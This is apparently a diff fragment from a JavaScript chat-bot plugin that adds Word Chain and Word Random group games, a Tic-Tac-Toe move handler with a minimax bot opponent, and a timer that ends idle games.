+    ctx.rt.games.set(ctx.chat, { type: 'wcg', words: new Set(), last: null, lastPlayer: null, scores: {}, deadline: Date.now() + 90000 });
+    await ctx.reply(`🔤 ${bold('Word Chain starts!')}\n\n• Send a real English word (3+ letters), e.g. *apple*\n• The next word must start with the last letter of the previous word\n• No repeats, and you can't play twice in a row\n• ⏱ 60 seconds per word\n\nSend the first word now!\nEnd with *${ctx.var('PREFIX')}wcg end*`, { title: 'Word Chain' });
+  });
+
+  /* ----------------------- word random game --------------------------- */
+  def('wrg', { cat: 'game', group: true, usage: 'wrg • wrg end', desc: 'Word Random Game: make words that start with the given letters before time runs out (90 seconds).' }, async ctx => {
+    const g = ctx.rt.games.get(ctx.chat);
+    const a = (ctx.argv[0] || '').toLowerCase();
+    if (a === 'end' || a === 'stop') {
+      if (!g || g.type !== 'wrg') throw new UserError('No word game is running.');
+      ctx.rt.games.delete(ctx.chat);
+      return ctx.reply(`🏁 ${bold('Round over!')}\n\n${board(g)}`, { title: 'Word Random' });
+    }
+    if (g) throw new UserError('A game is already running here.');
+    const fragment = U.pick(FRAGMENTS);
+    ctx.rt.games.set(ctx.chat, { type: 'wrg', fragment, words: new Set(), scores: {}, deadline: Date.now() + 90000 });
+    await ctx.reply(`🎲 ${bold('Word Random!')}\n\nMake real English words that START with:\n\n   ✨ *${fragment.toUpperCase()}* ✨\n\n• Each valid word scores its length in points\n• No repeats\n• ⏱ 90 seconds — go!`, { title: 'Word Random' });
+  });
+
+  /* ------------------------------ input hook -------------------------- */
+  hooks.push({
+    name: 'games', run: async ctx => {
+      const g = ctx.rt.games.get(ctx.chat);
+      if (!g || !ctx.fresh || !ctx.text || ctx.text.startsWith(ctx.prefix || '.')) return false;
+
+      if (g.type === 'ttt') {
+        if (!/^[1-9]$/.test(ctx.text)) return false;
+        const cur = g[g.turn];
+        if (cur.id !== ctx.senderNum) return false;
+        const i = Number(ctx.text) - 1;
+        if (g.board[i]) { await ctx.react('🚫'); return true; }
+        g.board[i] = g.turn;
+        const finish = async (msg) => { ctx.rt.games.delete(ctx.chat); await ctx.send({ text: ctx.frame(`${render(g.board)}\n\n${msg}`, { title: 'Tic-Tac-Toe' }), mentions: [g.X.jid, g.O.jid].filter(Boolean) }, { quoted: ctx.msg }); };
+        let w = winner(g.board);
+        if (w) { await finish(`🏆 ${bold(g[w].name)} wins!`); return true; }
+        if (g.board.every(Boolean)) { await finish('🤝 It\'s a draw!'); return true; }
+        g.turn = g.turn === 'X' ? 'O' : 'X';
+        if (g[g.turn].id === 'bot') {
+          const mv = minimax([...g.board], g.turn, g.turn).move;
+          g.board[mv] = g.turn;
+          w = winner(g.board);
+          if (w) { await finish('🤖 The bot wins this time!'); return true; }
+          if (g.board.every(Boolean)) { await finish('🤝 It\'s a draw!'); return true; }
+          g.turn = g.turn === 'X' ? 'O' : 'X';
+        }
+        g.deadline = Date.now() + 5 * 60000;
+        await ctx.send({ text: ctx.frame(`${render(g.board)}\n\n${g.turn === 'X' ? '❌' : '⭕'} ${bold(g[g.turn].name)}'s turn`, { title: 'Tic-Tac-Toe' }), mentions: [g[g.turn].jid].filter(Boolean) }, { quoted: ctx.msg });
+        return true;
+      }
+
+      if (!/^[A-Za-z]{3,20}$/.test(ctx.text)) return false;
+      const w = ctx.text.toLowerCase();
+      if (g.type === 'wcg') {
+        if (g.lastPlayer === ctx.senderNum && Object.keys(g.scores).length) { await ctx.react('🚫'); return true; }
+        if (g.words.has(w) || (g.last && w[0] !== g.last)) { await ctx.react('❌'); return true; }
+      } else if (g.type === 'wrg') {
+        if (!w.startsWith(g.fragment) || w.length < g.fragment.length + 2 || g.words.has(w)) { await ctx.react('❌'); return true; }
+      } else return false;
+      if (!(await isWord(w))) { await ctx.react('❌'); return true; }
+      g.words.add(w);
+      const s = g.scores[ctx.senderNum] || (g.scores[ctx.senderNum] = { id: '+' + ctx.senderNum, name: ctx.name, n: 0 });
+      s.n += g.type === 'wrg' ? w.length : 1;
+      if (g.type === 'wcg') {
+        g.last = w[w.length - 1]; g.lastPlayer = ctx.senderNum; g.deadline = Date.now() + 60000;
+        await ctx.react('✅');
+        await ctx.send({ text: `Next word starts with *${g.last.toUpperCase()}*` }, { quoted: ctx.msg });
+      } else await ctx.react('✅');
+      return true;
+    }
+  });
+
+  /* ------------------------------ timeouts ---------------------------- */
+  tickers.push({
+    name: 'gameTimeouts', run: async api => {
+      for (const [chat, g] of [...api.rt.games.entries()]) {
+        if (Date.now() < g.deadline) continue;
+        api.rt.games.delete(chat);
+        const txt = g.type === 'ttt' ? '⌛ Tic-Tac-Toe ended (no moves for 5 minutes).'
+          : g.type === 'wcg' ? `⌛ ${bold('Time is up!')}\n\n${board(g)}` : `⌛ ${bold('Round over!')}\n\n${board(g)}`;
+        await api.sendTo(chat, { text: api.frame(txt) }).catch(() => {});
+      }
+    }
+  });
+};
